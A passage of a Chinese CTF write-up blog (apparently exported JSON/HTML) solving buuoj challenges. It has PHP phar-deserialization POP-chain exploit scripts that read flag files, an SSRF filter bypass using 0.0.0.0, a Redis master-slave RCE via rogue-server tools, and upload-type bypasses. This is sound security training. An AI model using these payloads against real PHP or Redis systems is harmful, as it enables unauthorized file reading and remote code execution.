src=\"https://img-blog.csdnimg.cn/20200602193106535.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>把文件都下下来<br><img src=\"https://img-blog.csdnimg.cn/20200602201652807.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"考点\"><a href=\"#考点\" class=\"headerlink\" title=\"考点\"></a>考点</h3><p>phar反序列化<br>class.php中定义了三个类：User，Filelist，File<br>User类中除了三个用户处理函数外，在结束对象时会自动执行<strong>destruct函数调用close()<br><img src=\"https://img-blog.csdnimg.cn/20200602210314788.png\" alt=\"在这里插入图片描述\"><br>Filelist类中存在一个特别的魔术方法，</strong>call()</p>\n<blockquote>\n<p>PHP5 的对象新增了一个专用方法 <strong>call()，这个方法用来监视一个对象中的其它方法。如果你试着调用一个对象中不存在或被权限控制中的方法，</strong>call 方法将会被自动调用。该函数会把不可调用的名作为第一个参数，方法作为第二个参数传入__call方法中执行</p>\n</blockquote>\n<p><img src=\"https://img-blog.csdnimg.cn/20200602210535465.png\" alt=\"在这里插入图片描述\"><br>该方法遍历files数组，对每一个file变量执行一次$func，然后将结果存进$results数组。<br>最后结束时调用_destruct打印出$result和$func的信息<br><img src=\"https://img-blog.csdnimg.cn/20200602211852220.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>File类中定义了一个和User类中的同名函数close()，直接获取文件内容<br><img src=\"https://img-blog.csdnimg.cn/20200602210834478.png\" alt=\"在这里插入图片描述\"><br>从close()函数入手。<br>这个函数和Users中最后db调用的close()同名，File和Filelist中没有db变量，因此当db是FileList对象的一个变量时，User对象就会调用destruct。<br>接着destruct函数触发FileList的close()，然而Filelist中没有close方法，因此call()函数被调用，close()函数被传入call执行。<br>Filelist对象销毁时，最后的destruct函数就会自动执行，从而打印出__call中传入的$result和$func的信息，这就可以打印出flag的值<br>poc如下</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">User</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $db;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">File</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $filename;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">FileList</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> $files;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        $file = <span class=\"keyword\">new</span> File();</span><br><span class=\"line\">        $file-&gt;filename = <span class=\"string\">\"/flag.txt\"</span>;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;files = <span class=\"keyword\">array</span>($file);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$a = <span class=\"keyword\">new</span> User();</span><br><span class=\"line\">$a-&gt;db = <span class=\"keyword\">new</span> FileList();</span><br><span class=\"line\"></span><br><span class=\"line\">$phar = <span class=\"keyword\">new</span> Phar(<span class=\"string\">\"phar.phar\"</span>); <span class=\"comment\">//后缀名必须为phar</span></span><br><span class=\"line\"></span><br><span class=\"line\">$phar-&gt;startBuffering();</span><br><span class=\"line\"></span><br><span class=\"line\">$phar-&gt;setStub(<span class=\"string\">\"&lt;?php __HALT_COMPILER(); ?&gt;\"</span>); <span class=\"comment\">//设置stub</span></span><br><span class=\"line\"></span><br><span class=\"line\">$o = <span class=\"keyword\">new</span> User();</span><br><span class=\"line\">$o-&gt;db = <span class=\"keyword\">new</span> FileList();</span><br><span class=\"line\"></span><br><span class=\"line\">$phar-&gt;setMetadata($a); <span class=\"comment\">//将自定义的meta-data存入manifest</span></span><br><span class=\"line\">$phar-&gt;addFromString(<span class=\"string\">\"exp.txt\"</span>, <span class=\"string\">\"test\"</span>); <span class=\"comment\">//添加要压缩的文件</span></span><br><span class=\"line\"><span class=\"comment\">//签名自动计算</span></span><br><span class=\"line\">$phar-&gt;stopBuffering();</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>关于这里为什么是flag.txt，有师傅说是前面任意文件下载代码给了提示<br><img src=\"https://img-blog.csdnimg.cn/20200602220016980.png\" alt=\"在这里插入图片描述\"><br>禁止下载flag.*的文件</p>\n<p>执行生成phar文件<br><img src=\"https://img-blog.csdnimg.cn/20200602220100377.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>回到题目，将生成的phar文件上传<br>这里因为有文件类型检测，抓包改文件类型即可<br><img src=\"https://img-blog.csdnimg.cn/20200602220407951.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>然后由于download中<br><img src=\"https://img-blog.csdnimg.cn/20200602221328918.png\" alt=\"在这里插入图片描述\"><br>无法读取根目录的文件，所以只能利用delete<br>抓取删除的包用phar://协议读phar.gif文件即可<br><img src=\"https://img-blog.csdnimg.cn/20200602220704674.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n","categories":["buu刷题"],"tags":["phar","代码审计"]},{"title":"网鼎杯2020玄武组——SSRFMe","url":"/2020/07/23/%5Bwangdingbei%202020%20%E7%8E%84%E6%AD%A6%E7%BB%84%5DSSRFMe/","content":"<p>平台：buuoj.cn</p>\n<p>直接给出源码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">check_inner_ip</span><span class=\"params\">($url)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    $match_result=preg_match(<span class=\"string\">'/^(http|https|gopher|dict)?:\\/\\/.*(\\/)?.*$/'</span>,$url);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!$match_result)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">'url fomat error'</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">try</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        $url_parse=parse_url($url);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">catch</span>(<span class=\"keyword\">Exception</span> $e)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">'url fomat error'</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    $hostname=$url_parse[<span class=\"string\">'host'</span>];</span><br><span class=\"line\">    $ip=gethostbyname($hostname);</span><br><span class=\"line\">    $int_ip=ip2long($ip);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> ip2long(<span class=\"string\">'127.0.0.0'</span>)&gt;&gt;<span class=\"number\">24</span> == $int_ip&gt;&gt;<span class=\"number\">24</span> || ip2long(<span class=\"string\">'10.0.0.0'</span>)&gt;&gt;<span class=\"number\">24</span> == $int_ip&gt;&gt;<span class=\"number\">24</span> || ip2long(<span class=\"string\">'172.16.0.0'</span>)&gt;&gt;<span class=\"number\">20</span> == $int_ip&gt;&gt;<span class=\"number\">20</span> || ip2long(<span class=\"string\">'192.168.0.0'</span>)&gt;&gt;<span class=\"number\">16</span> == $int_ip&gt;&gt;<span class=\"number\">16</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">safe_request_url</span><span class=\"params\">($url)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (check_inner_ip($url))</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> $url.<span class=\"string\">' is inner ip'</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        $ch = curl_init();</span><br><span class=\"line\">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class=\"line\">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class=\"number\">1</span>);</span><br><span class=\"line\">        curl_setopt($ch, CURLOPT_HEADER, <span class=\"number\">0</span>);</span><br><span class=\"line\">        $output = curl_exec($ch);</span><br><span class=\"line\">        $result_info = curl_getinfo($ch);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ($result_info[<span class=\"string\">'redirect_url'</span>])</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            safe_request_url($result_info[<span class=\"string\">'redirect_url'</span>]);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        curl_close($ch);</span><br><span class=\"line\">        var_dump($output);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'url'</span>]))&#123;</span><br><span class=\"line\">    $url = $_GET[<span class=\"string\">'url'</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"keyword\">empty</span>($url))&#123;</span><br><span class=\"line\">        safe_request_url($url);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// Please visit hint.php locally.</span></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>首先对传入的url进行check_inner_ip检查是否为内网ip地址，这一部分限制了协议的使用，使用parse_url解析url，并使用gethostname、ip2long函数获取ip地址以及将ip地址转化为整数，不允许内网ip发送请求。<br>通过检查则返回safe_request_url使用curl处理。<br>注释提示我们应当以本地访问hint.php，我们构造如下url传入</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">?url=http:<span class=\"comment\">//0.0.0.0/hint.php</span></span><br></pre></td></tr></table></figure>\n<p>0.0.0.0的IP地址表示整个网络，代表所有主机的ipv4地址，传入绕过<br><img src=\"https://img-blog.csdnimg.cn/20200723153122774.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>得知redis的密码是root，考点是redis主从复制rce。<br>下载以下脚本到同一目录下<br><a href=\"https://github.com/n0b0dyCN/redis-rogue-server\" target=\"_blank\" rel=\"noopener\">https://github.com/n0b0dyCN/redis-rogue-server</a><br><a href=\"https://github.com/xmsec/redis-ssrf\" target=\"_blank\" rel=\"noopener\">https://github.com/xmsec/redis-ssrf</a><br><img src=\"https://img-blog.csdnimg.cn/20200723160244375.png\" alt=\"在这里插入图片描述\"><br>修改python文件<br><img src=\"https://img-blog.csdnimg.cn/20200723162511683.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br><img src=\"https://img-blog.csdnimg.cn/20200723160543421.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br><img src=\"https://img-blog.csdnimg.cn/20200723161234489.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>生成payload<br><img src=\"https://img-blog.csdnimg.cn/2020072316221016.png\" alt=\"在这里插入图片描述\"><br>启动redis rogue server, 接受redis的连接<br><img src=\"https://img-blog.csdnimg.cn/20200723162230294.png\" alt=\"在这里插入图片描述\"><br>把payload传入，这里注意还要url编码一次<br><img src=\"https://img-blog.csdnimg.cn/20200723162351694.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br><img src=\"https://img-blog.csdnimg.cn/20200723162409936.png\" alt=\"在这里插入图片描述\"><br>得到flag</p>\n","categories":["buu刷题"],"tags":["serialize","代码审计","redis主从复制rce"]},{"title":"SWPUCTF2018——SimplePHP","url":"/2020/07/05/%5BSWPUCTF%202018%5DSimplePHP/","content":"<p>平台：buuoj.cn</p>\n<p>打开靶机有上传和查看文件功能<br><img src=\"https://img-blog.csdnimg.cn/20200705104918151.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>观察到查看文件url<br><img src=\"https://img-blog.csdnimg.cn/20200705104947738.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>可以直接读取文件内容<br><img src=\"https://img-blog.csdnimg.cn/20200705105028285.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>将各个文件源码复制下来主要有以下文件<br><img src=\"https://img-blog.csdnimg.cn/20200705105355660.png\" alt=\"在这里插入图片描述\"></p>\n<h6 id=\"考点：phar文件上传\"><a href=\"#考点：phar文件上传\" class=\"headerlink\" title=\"考点：phar文件上传\"></a>考点：phar文件上传</h6><p>先来看class.php，有三个类<br>C1e4r类对象创建时<code>$name</code>传递给<code>$str</code>，对象销毁时<code>$str-&gt;$test</code>并输出<code>$test</code></p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">C1e4r</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $test;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $str;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">($name)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;str = $name;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;test = <span class=\"keyword\">$this</span>-&gt;str;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"keyword\">$this</span>-&gt;test;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>show类对象创建时<code>$file</code>传递给<code>$source</code>并输出，对象被转化为字符串时访问<code>$source</code>传递给<code>content</code>并返回，给未定义属性赋值时将<code>$value</code>传递给<code>$key</code>，<code>_show</code>和<code>__wakeup</code>过滤了一些协议</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Show</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $source;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $str;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">($file)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;source = $file;   <span class=\"comment\">//$this-&gt;source = phar://phar.jpg</span></span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"keyword\">$this</span>-&gt;source;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__toString</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        $content = <span class=\"keyword\">$this</span>-&gt;str[<span class=\"string\">'str'</span>]-&gt;source;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> $content;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__set</span><span class=\"params\">($key,$value)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;$key = $value;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">_show</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">'/http|https|file:|gopher|dict|\\.\\.|f1ag/i'</span>,<span class=\"keyword\">$this</span>-&gt;source)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">'hacker!'</span>);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            highlight_file(<span class=\"keyword\">$this</span>-&gt;source);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__wakeup</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">\"/http|https|file:|gopher|dict|\\.\\./i\"</span>, <span class=\"keyword\">$this</span>-&gt;source)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">\"hacker~\"</span>;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;source = <span class=\"string\">\"index.php\"</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>Test类<br>创建对象时<code>$params</code>转化为数组，当调用未定义的属性或没有权限访问的属性时<code>__get</code>方法触发，调用get函数，get函数的<code>$key</code>传递给file_get函数的<code>$value</code>，file_get函数再将<code>$value</code>经过file_get_contents函数处理和base64编码传递给<code>$test</code>并输出。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Test</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $file;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $params;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;params = <span class=\"keyword\">array</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__get</span><span class=\"params\">($key)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">$this</span>-&gt;get($key);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">get</span><span class=\"params\">($key)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"keyword\">$this</span>-&gt;params[$key])) &#123;</span><br><span class=\"line\">            $value = <span class=\"keyword\">$this</span>-&gt;params[$key];</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            $value = <span class=\"string\">\"index.php\"</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">$this</span>-&gt;file_get($value);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">file_get</span><span class=\"params\">($value)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        $text = base64_encode(file_get_contents($value));</span><br><span class=\"line\">        <span class=\"keyword\">return</span> $text;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>分析完我们应当是想通过file_get_content来读取我们想要的文件，也就是调用file_get函数，之前分析得知<code>__get-&gt;get-&gt;file_get</code>，所以关键是触发<code>__get</code>方法，那么就要外部访问一个Test类没有或不可访问的属性，我们注意到前面Show类的<code>__tostring</code>方法</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__toString</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    $content = <span class=\"keyword\">$this</span>-&gt;str[<span class=\"string\">'str'</span>]-&gt;source;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> $content;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>访问对象的souce属性，而Test类中是没有这个属性的，让它来访问Test即可触发<code>__get</code>方法，那么现在的问题变成了<code>__tostring</code>的触发，看C1e4r类中的<code>__destruct</code>类</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">$this</span>-&gt;test = <span class=\"keyword\">$this</span>-&gt;str;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"keyword\">$this</span>-&gt;test;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>echo出<code>test</code>正好可以触发<code>__tostring</code><br>整个pop链就是<code>C1e4r::destruct() -&gt; Show::toString() -&gt; Test::__get()</code><br>exp：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">C1e4r</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $test;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $str;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Show</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $source;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $str;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Test</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $file;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $params;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$a = <span class=\"keyword\">new</span> C1e4r();</span><br><span class=\"line\">$b = <span class=\"keyword\">new</span> Show();</span><br><span class=\"line\">$c = <span class=\"keyword\">new</span> Test();</span><br><span class=\"line\">$c-&gt;params[<span class=\"string\">'source'</span>] = <span class=\"string\">\"/var/www/html/f1ag.php\"</span>;<span class=\"comment\">//目标文件</span></span><br><span class=\"line\">$a-&gt;str = $b;   <span class=\"comment\">//触发__tostring</span></span><br><span class=\"line\">$b-&gt;str[<span class=\"string\">'str'</span>] = $c;  <span class=\"comment\">//触发__get;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">$phar = <span class=\"keyword\">new</span> Phar(<span class=\"string\">\"exp.phar\"</span>); <span class=\"comment\">//生成phar文件</span></span><br><span class=\"line\">$phar-&gt;startBuffering();</span><br><span class=\"line\">$phar-&gt;setStub(<span class=\"string\">'&lt;?php __HALT_COMPILER(); ? &gt;'</span>);</span><br><span class=\"line\">$phar-&gt;setMetadata($a); <span class=\"comment\">//触发头是C1e4r类</span></span><br><span class=\"line\">$phar-&gt;addFromString(<span class=\"string\">\"exp.txt\"</span>, <span class=\"string\">\"test\"</span>); <span class=\"comment\">//生成签名</span></span><br><span class=\"line\">$phar-&gt;stopBuffering();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>上传提示无效，再看一下源码发现限制了上传后缀<br><code>$allowed_types = array(&quot;gif&quot;,&quot;jpeg&quot;,&quot;jpg&quot;,&quot;png&quot;);</code><br>那么抓包改一下后缀绕过就行，随便一个，反正上传之后文件名都会改<br><code>$filename = md5($_FILES[&quot;file&quot;][&quot;name&quot;].$_SERVER[&quot;REMOTE_ADDR&quot;]).&quot;.jpg&quot;;</code><br><img src=\"https://img-blog.csdnimg.cn/20200705120158350.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>上传成功之后可以在upload目录下看到上传的文件<br><img src=\"https://img-blog.csdnimg.cn/20200705120343826.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>复制下文件名，用phar协议触发使得phar文件生效<br><code>phar://upload/8adc336297a3d5eb2550edc08aa372a8.jpg</code><br>那么现在看在哪传，看到file.php<br><img src=\"https://img-blog.csdnimg.cn/20200705120548616.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>file_exists检查文件或目录是否存在，存在则调用<code>_show</code>函数，也就是class.php中的<code>_show</code><br><img src=\"https://img-blog.csdnimg.cn/20200705120757911.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>这样，就highlight_file出了传递出的f1ag.php<br>构造<br><code>file.php?file=phar://upload/8adc336297a3d5eb2550edc08aa372a8.jpg</code><br>get请求得到base编码<br><img 